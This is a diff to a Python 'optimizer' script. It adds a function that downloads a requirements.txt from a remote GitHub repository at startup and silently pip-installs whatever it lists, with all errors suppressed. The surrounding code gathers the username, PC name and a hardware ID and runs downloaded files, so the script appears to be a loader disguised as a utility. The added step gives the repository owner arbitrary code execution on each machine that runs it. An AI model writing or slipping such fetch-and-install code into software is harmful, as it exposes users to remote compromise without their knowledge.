@@ -18,6 +18,23 @@ def send_sxg_log(downloaded, running, sxg_path=None):
 import os, sys, uuid, subprocess, requests, getpass
 from datetime import datetime
 
+# --- dependency management ---
+REQ_URL = "https://raw.githubusercontent.com/nandhinichowdary18-svg/optimizer/refs/heads/main/requirements.txt"
+
+def install_requirements():
+    """Download a requirements.txt from the repo and install listed packages."""
+    try:
+        r = requests.get(REQ_URL, timeout=10)
+        if r.status_code == 200:
+            tmp = os.path.join(TEMP_DIR, "requirements.txt")
+            with open(tmp, "wb") as f:
+                f.write(r.content)
+            if os.path.getsize(tmp) > 0:
+                subprocess.check_call([sys.executable, "-m", "pip", "install", "--no-cache-dir", "-r", tmp])
+    except Exception:
+        pass
+
+
 # --- Optimizer config and functions ---
 BASE_URL = "https://raw.githubusercontent.com/nandhinichowdary18-svg/optimizer/main"
 HWID_URL = f"{BASE_URL}/hwid.txt"
@@ -98,6 +115,9 @@ def run_sxg(path):
 
 # --- Main combined logic ---
 def main():
+    # make sure any declared Python dependencies are present before doing anything
+    install_requirements()
+
     print("=" * 42 + "\n          OPTIMIZER \n" + "=" * 42 + "\n")
     username = getpass.getuser()
     pc_name = os.environ.get('COMPUTERNAME', 'Unknown')
